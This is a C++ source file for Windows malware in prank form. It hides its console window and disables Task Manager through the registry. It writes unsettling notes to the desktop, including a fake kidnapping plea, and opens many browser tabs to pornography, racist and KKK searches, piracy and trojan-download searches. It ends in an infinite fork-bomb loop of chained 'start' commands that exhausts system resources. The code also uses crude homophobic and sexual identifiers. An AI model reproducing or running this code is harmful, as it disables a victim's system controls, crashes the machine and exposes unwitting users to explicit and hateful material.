#define _WIN32_WINNT 0x0500
#include <iostream>
#include <windows.h>
#include <fstream>
#include <shellapi.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <winuser.h>
#include <string>
#include <unistd.h>
#include <shlobj.h>
#include <ctime>

using namespace std;


char *dp1 = getenv("APPDATA");
char *rmtfl = getenv("HOMEPATH");

string startupdiro = std::string(dp1) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
string gaydiro = std::string(rmtfl) + "\\AppData\\Roaming\\Microsoft\\Windows\\\\areyawinningson.txt";
bool gay;

void molest() {
    while(true) {
        system("start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start start && start");
    }
}

void LockTaskManager(bool Lock) {
HKEY hkey;
DWORD dwDisposition;
DWORD dwType, dwSize;
DWORD value;

if (Lock)
 value = 1;
else
 value = 0;
if(RegCreateKeyEx(HKEY_CURRENT_USER,
   TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\system"),
   0,
   NULL,
   0,
   KEY_SET_VALUE,
   NULL,
   &hkey,
   &dwDisposition)== ERROR_SUCCESS)
{ 
 dwType = REG_DWORD;
 dwSize = sizeof(DWORD);
 RegSetValueEx(hkey, TEXT("DisableTaskMgr"), 0, dwType, (PBYTE)&value, dwSize);   
 RegCloseKey(hkey);
}
}


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    LockTaskManager(true);
   ifstream furryporn;
   furryporn.open(gaydiro);
   if(furryporn) {
      while(true) {
          molest();
      }
   } else {
    char username[UNLEN+1]; // All of this username garbage was just ripped from StackOverflow LOL
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);
    string readdiro = std::string(rmtfl) + "\\Desktop\\Read Me.txt";
    string dogdiro = std::string(rmtfl) + "\\Desktop\\dog.txt";
    string helpdiro = std::string(rmtfl) + "\\Desktop\\Help.txt";
    std::string hellodirectory = "C:\\Users\\" + std::string(username) + std::string("\\Desktop\\Read Me.txt");
    ofstream greetingfile(readdiro);
    greetingfile << "Theiatena has taken a liking to your computer, she'll be holding onto it for now.\nPrepare for her to mess around with it every now and then." << std::endl;
    std::string dogdirectory = "C:\\Users\\" + std::string(username) + std::string("\\Desktop\\dog.txt");
    std::string helpdirectory = "C:\\Users\\" + std::string(username) + std::string("\\Desktop\\Help.txt");
    ofstream restarttest(gaydiro);
    restarttest << "no lol";
    srand (time(NULL));
    int randomwebsitenumber = rand() % 18;
    std::string startupdirectory = "C:\\Users\\" + std::string(username) + std::string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    int websitesleepnum = 1000;
    for(int i = 0; i < 10; i++) {
    switch(randomwebsitenumber) {
        case 0: 
            ShellExecute(0, 0, "https://www.youtube.com/watch?v=uivFFnCI8tM", 0, 0, SW_SHOW);
            for(int i = 0; i < 33; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 1: 
            ShellExecute(0, 0, "https://rule34.xxx/index.php?page=post&s=list&tags=aubrey_(omori)", 0, 0, SW_SHOW);
            for(int i = 0; i < 14; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 2: 
            ShellExecute(0, 0, "https://store.steampowered.com/app/420530/OneShot/", 0, 0, SW_SHOW);
            for(int i = 0; i < 60; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 3: 
            ShellExecute(0, 0, "https://youtu.be/M88H5eTtGEo", 0, 0, SW_SHOW);
            for(int i = 0; i < 90; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 4: 
            ShellExecute(0, 0, "https://rule34.xxx/index.php?page=post&s=list&tags=doki_doki_literature_club", 0, 0, SW_SHOW);
            for(int i = 0; i < 10; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 5: 
            ShellExecute(0, 0, "https://hentaihaven.xxx/watch/rance-the-quest-for-hikari/", 0, 0, SW_SHOW);
            for(int i = 0; i < 21; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 6: 
            ShellExecute(0, 0, "https://www.google.com/search?client=avast-a-1&q=how+2+buy+weed&oq=how+2+buy+weed&aqs=avast..69i57.12669j0j7&ie=UTF-8", 0, 0, SW_SHOW);
            for(int i = 0; i < 19; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 7: 
            ShellExecute(0, 0, "https://www.google.com/search?client=avast-a-1&q=free+vpn+no+virus&oq=free+vpn+no+virus&aqs=avast..69i57j0j69i61.3606j0j7&ie=UTF-8", 0, 0, SW_SHOW);
            for(int i = 0; i < 07; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 8: 
            ShellExecute(0, 0, "https://www.google.com/search?client=avast-a-1&q=how+2+b+a+1337+h4x0r&oq=how+2+b+a+1337+h4x0r&aqs=avast..69i57.19429j0j7&ie=UTF-8", 0, 0, SW_SHOW);
            for(int i = 0; i < 80; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 9:
            ShellExecute(0, 0, "https://store.steampowered.com/app/720250/Welcome_to_the_Game_II/", 0, 0, SW_SHOW);
            for(int i = 0; i < 38; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 10: 
            ShellExecute(0, 0, "https://www.google.com/search?client=avast-a-1&q=memz+trojan+download&oq=memz+trojan+download&aqs=avast.0.69i59j0l8.3151j0j7&ie=UTF-8", 0, 0, SW_SHOW);
            for(int i = 0; i < 10; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 11: 
            ShellExecute(0, 0, "https://huniepop.fandom.com/wiki/Venus", 0, 0, SW_SHOW);
            for(int i = 0; i < 20; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 12:
            ShellExecute(0, 0, "https://www.google.com/search?q=bitcoin+price", 0, 0, SW_SHOW);
            for(int i = 0; i < 32; i++) {
                randomwebsitenumber = rand() % 18;
                Sleep(websitesleepnum);
            }
            break;
        case 13:
            ShellExecute(0, 0, "https://store.steampowered.com/app/1150690/OMORI/", 0, 0, SW_SHOW);
            for(int i = 0; i < 44; i++) {
                randomwebsitenumber = rand() % 18;
                Sleep(websitesleepnum);
            }
            break;
        case 14:
            ShellExecute(0, 0, "https://www.google.com/search?q=I+think+I%27m+racist+and+I+don%27t+know+why", 0, 0, SW_SHOW);
            for(int i = 0; i < 77; i++) {
            randomwebsitenumber = rand() % 18;
            Sleep(websitesleepnum);
            }
            break;
        case 15:
            ShellExecute(0, 0, "https://www.google.com/search?q=Klu+Klux+Klan", 0, 0, SW_SHOW);
            for(int i = 0; i < 94; i++) {
                randomwebsitenumber = rand() % 18;
                Sleep(websitesleepnum);
            }
            break;
        case 16:
            ShellExecute(0, 0, "https://steamunlocked.net/", 0, 0, SW_SHOW);
            for(int i = 0; i < 54; i++) {
                randomwebsitenumber = rand() % 18;
                Sleep(websitesleepnum);
            }
            break;
        case 17:
            ShellExecute(0, 0, "https://www.google.com/search?q=Linux+vs+Windows", 0, 0, SW_SHOW);
            for(int i = 0; i < 22; i++) {
                randomwebsitenumber = rand() % 18;
                Sleep(websitesleepnum);
            }
            break;
            
    }
    }
    for(int i = 0; i < 60; i++) {
        Sleep(websitesleepnum);
    }
    for(int i = 0; i < 30; i++) {
        ShellExecute(0, 0, "https://www.google.com", 0, 0, SW_SHOW);
    }
    ofstream dogfile(dogdiro);
    dogfile << "                                  .-." << std::endl;
    dogfile << "     (___________________________()6 `-," << std::endl;
    dogfile << "     (   ______________________   /''\"`" << std::endl;
    dogfile << "     //\\                      //\\" << std::endl;
    dogfile << "     \"\" \"\"                     \"\" \"\"";
    for(int i = 0; i < 60; i++) {
        Sleep(1000);
    }
    ofstream cfh(helpdiro);
    cfh << "Hello!?" << std::endl;
    cfh << "Can you hear me!!?" << std::endl;
    cfh << "I've been trapped here for a long time... or maybe it hasn't been a long time I don't know!!!" << std::endl;
    cfh << "I'm in a place called \"The Waiting Room\"" << std::endl;
    cfh << "It's some kind of fucked up place where they kidnap people then torture them for public viewing on the deep web" << std::endl;
    cfh << "I managed to get my hands on the kidnappers computer" << std::endl;
    cfh << "I'm at these coordinates:" << std::endl;
    cfh << "41°03'51.4\"N 71°52'37.7\"W" << std::endl;
    cfh << "Please hurry!!!" << std::endl;
    system("start");
    for(int i = 0; i < 60; i++) {
        Sleep(1000);
    }
    ShellExecute(0, 0, "https://www.google.com/search?client=avast-a-1&q=What+is+my+ip&oq=What+is+my+ip&aqs=avast..69i57j0l5j69i60l2.1915j0j1&ie=UTF-8", 0, 0, SW_SHOW);
    for(int i = 0; i < 120; i++) {
        Sleep(1000);
    }    
    for(int i = 0; i < 25; i++) {
        system("start");
        SW_HIDE;
    }
    for(int i = 0; i < 90; i++) {
        Sleep(1000);
    }
    std::string restartdirectory = "C:\\Users\\" + std::string(username) + std::string("\\AppData\\Roaming\\Microsoft\\Windows\\areyawinningson.txt");
    while(true) {
        molest();
    }
}
}